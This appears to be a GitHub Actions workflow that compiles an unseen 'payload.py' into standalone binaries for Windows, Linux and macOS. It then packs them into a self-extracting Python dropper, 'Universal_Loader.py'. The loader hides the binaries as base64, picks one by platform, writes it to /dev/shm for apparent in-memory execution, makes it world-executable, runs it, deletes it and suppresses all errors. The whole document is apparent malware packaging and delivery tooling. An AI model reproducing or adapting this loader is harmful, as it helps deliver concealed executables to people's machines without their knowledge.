name: Nixon Nuitka Build
on:
  workflow_dispatch:

jobs:
  build-farm:
    strategy:
      fail-fast: false
      matrix:
        include:
          - os: windows-latest
            suffix: .exe
            output_name: payload.exe
            final_name: payload.windows.exe
          - os: ubuntu-22.04
            suffix: .bin
            output_name: payload.bin
            final_name: payload.linux.bin
          - os: macos-latest
            suffix: .bin
            output_name: payload.bin
            final_name: payload.macos.bin
    runs-on: ${{ matrix.os }}
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4
        with:
          ref: main
          fetch-depth: 0

      - name: Setup Python
        
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'
          
      - name: Install Nuitka
        
        run: pip install nuitka zstandard ordered-set requests websockets

      - name: Build Windows
        if: matrix.os == 'windows-latest'
        shell: bash
        run: |
          python -m nuitka --standalone --onefile --remove-output --assume-yes-for-downloads --include-package=runpy --include-package=importlib --include-package=ctypes --include-package=encodings --include-package=asyncio --include-module=uuid,json,ssl,socket,base64,lzma,struct,hashlib,hmac,secrets,datetime,threading,multiprocessing,subprocess,platform,argparse,urllib.request,shutil,tempfile,random,warnings,contextlib,weakref,signal,bisect,email,http,requests,websockets,websockets.exceptions,websockets.legacy,websockets.legacy.client --output-filename=${{ matrix.output_name }} payload.py
          mv ${{ matrix.output_name }} ${{ matrix.final_name }}
      - name: Build Linux/macOS
        if: matrix.os != 'windows-latest'
        run: |
          python -m nuitka --standalone --onefile --remove-output --assume-yes-for-downloads --include-package=runpy --include-package=importlib --include-package=ctypes --include-package=encodings --include-package=asyncio --include-module=uuid,json,ssl,socket,base64,lzma,struct,hashlib,hmac,secrets,datetime,threading,multiprocessing,subprocess,platform,argparse,urllib.request,shutil,tempfile,random,warnings,contextlib,weakref,signal,bisect,email,http,requests,websockets,websockets.exceptions,websockets.legacy,websockets.legacy.client --output-filename=${{ matrix.output_name }} payload.py
          mv ${{ matrix.output_name }} ${{ matrix.final_name }}
      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: build-${{ matrix.final_name }}
          path: ${{ matrix.final_name }}
          retention-days: 1

  pack:
    needs: build-farm
    runs-on: ubuntu-latest
    name: Universal Packer
    steps:
      - uses: actions/checkout@v4
      - name: Download All Artifacts
        uses: actions/download-artifact@v4
        with:
          path: artifacts
          merge-multiple: true
      
      - name: Flatten Artifacts
        run: |
          find artifacts -type f -exec mv {} . \;
          ls -la          
      - name: Create Packer Script
        run: |
          cat << 'EOF' > packer.py
          import sys, os, zipfile, io, base64, tempfile, shutil, subprocess, platform
          
          def get_platform_key():
              s = platform.system().lower()
              if "windows" in s: return "windows"
              if "darwin" in s: return "macos"
              if "linux" in s:
                  if os.path.exists("/system/build.prop") or os.path.exists("/data/data/com.termux"):
                      return "android"
                  return "linux"
              return "unknown"
          
          def pack():
              print("[*] Starting Universal Pack...")
              # Map artifact names to internal keys
              mapping = {
                  "payload.windows.exe": "windows",
                  "payload.linux.bin": "linux",
                  "payload.macos.bin": "macos",
                  "payload.android.bin": "android"
              }
              
              final_zip = io.BytesIO()
              # Create an optimized ZIP in memory (LZMA compression for max ratio)
              with zipfile.ZipFile(final_zip, "w", zipfile.ZIP_LZMA) as z:
                  for root, _, files in os.walk("."):
                      for f in files:
                          if f in mapping:
                              print(f" [+] Adding {f} as {mapping[f]}...")
                              z.write(f, mapping[f])
              
              # Encode ZIP to Base64
              payload_b64 = base64.b64encode(final_zip.getvalue()).decode()
              
              # Generate the self-extracting Python loader
              loader_code = f"""# -*- coding: utf-8 -*-
          import sys, os, base64, zipfile, io, tempfile, subprocess, platform, shutil
          
          PAYLOAD = "{payload_b64}"
          
          def run():
              # 1. Detect Platform
              s = platform.system().lower()
              target = "linux"
              if "windows" in s: target = "windows"
              elif "darwin" in s: target = "macos"
              elif "linux" in s:
                  if os.path.exists("/system/build.prop"): target = "android"
              
              # 2. Extract specific binary for this platform
              try:
                  raw = base64.b64decode(PAYLOAD)
                  with zipfile.ZipFile(io.BytesIO(raw)) as z:
                      if target not in z.namelist():
                          return
                      
                      # 3. Write to temp (Memory-backed on Linux if possible, Disk on Win)
                      # Linux: Try /dev/shm for true in-memory execution
                      mem_path = "/dev/shm" if os.path.exists("/dev/shm") else tempfile.gettempdir()
                      ext = ".exe" if target == "windows" else ".bin"
                      
                      fd, path = tempfile.mkstemp(suffix=ext, dir=mem_path)
                      os.close(fd)
                      
                      with open(path, "wb") as f:
                          f.write(z.read(target))
                      
                      os.chmod(path, 0o777)
                      
                      # 4. Execute
                      try:
                          subprocess.call([path] + sys.argv[1:])
                      finally:
                          if os.path.exists(path):
                              try: os.remove(path)
                              except: pass
              except Exception: pass
          
          if __name__ == "__main__":
              run()
          """
              with open("Universal_Loader.py", "w") as f:
                  f.write(loader_code)
              print("[+] Universal_Loader.py generated.")
          
          if __name__ == "__main__":
              pack()
          EOF
          
      - name: Run Packer
        run: python packer.py
        
      - name: Upload Universal Loader
        uses: actions/upload-artifact@v4
        with:
          name: Universal_Loader
          path: Universal_Loader.py
